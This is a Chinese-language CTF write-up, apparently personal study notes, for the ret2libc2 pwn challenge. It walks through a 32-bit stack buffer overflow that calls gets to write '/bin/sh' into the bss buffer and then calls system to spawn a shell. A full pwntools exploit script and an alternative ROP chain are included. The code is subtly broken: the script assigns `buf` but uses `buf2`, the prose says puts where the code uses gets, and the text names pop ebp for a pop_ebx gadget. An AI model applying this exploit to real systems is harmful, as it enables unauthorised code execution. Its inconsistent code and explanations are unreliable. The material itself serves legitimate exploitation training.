方法一：宏观思路：用我们的 `gets()` 函数来直接写入。
方法 2：用我们的 `sh` 来代替我们的 `/bin/sh`
1. 我们用我们的 IDA 打开我们的程序，我们能够发现如下所示的代码
![[Pasted image 20231203213217.png]]
2. 我们发现，我们是存在一次对我们 `system` 函数的调用，于是我们考虑使用我们的 `ret2libc` 来进行操作，我们先 copy 一下我们例题 1 的脚本。

3. 执行后，我们发现，我们的对应函数并没有我们的 `\bin\sh` 的对应片段，这个时候，我们就需要我们自己构造我们的 `\bin\sh`.
4. 然后，我们考虑向我们的什么地方写入我们的 `\bin\sh`,我们首先，我们可以考虑我们的栈，但是因为我们**随机化载入**，我们这么做不太稳定。
5. 此时，我们就需要向我们的 bss（未初始化或初始化为 0 的全局变量和静态变量的区域） 写入我们的 `\bin\sh`,我们的操作如下：
1. 找到我们的全局变量 bss 所在的段
![[Pasted image 20231203213952.png]]

2. 修改我们的对应的 bss 段数据，其实这里，我们要做的，也只是在我们的语句前面多加入一个 `gets(buf2)` 而已
![[Pasted image 20231203214548.png]]

payload 构造流程：
1. 计算我们垃圾数据的个数，
2. 从我们的 IDA 中，得到我们的 `gets@plt`, `system@plt`,
3. 从我们的 IDA 中，得到哦我们的 `buf2` 的地址，
![[Pasted image 20231203215048.png]]
然后我们的构造就是：
垃圾数据+ `puts@plt` + `system@plt` + `buf2` 地址+ `buf2` 地址

```python
from pwn import *
io=remote("",00000);
elf=ELF("./ret2libc2");
# elf.symbols["buf2"];//获取我们buf2的地址
buf=elf.symbols["buf2"];
gets_plt=elf.plt["gets"];
system_plt=elf.plt["system"];
io.recv();
payload=112*b'a'+p32(gets_plt)+p32(system_plt)+p32(buf2)+p32(buf2)
io.sendline(payload);
io.sendline(b"/bin/sh\x00");
io.interactive();
```

此外，我们的 `payload` 的构造，还可采用我们的
```python
payload=([b'a'*112,get_plt,pop_ebx,buf2,system_plr,0xdeadbeef,buf2])
```
这里，我们的攻击仍然是可以成功的，因为我们再执行我们的 `get_plt` 后，我们再去执行我们的 `pop_ebx`,就能够平衡我们的栈。

这里的原理在于：我们用完就扔，在我们不断向后读取的过程中，我们的 `foo@plt`,和我们的参数之间的段，如果执行的操作是把我们的 `foo` 的参数给清理掉，那么我们就可以用这一条函数来**平衡我们的栈**。不出所料，这里我们最为合适的函数就是我们的 `pop ebp`。


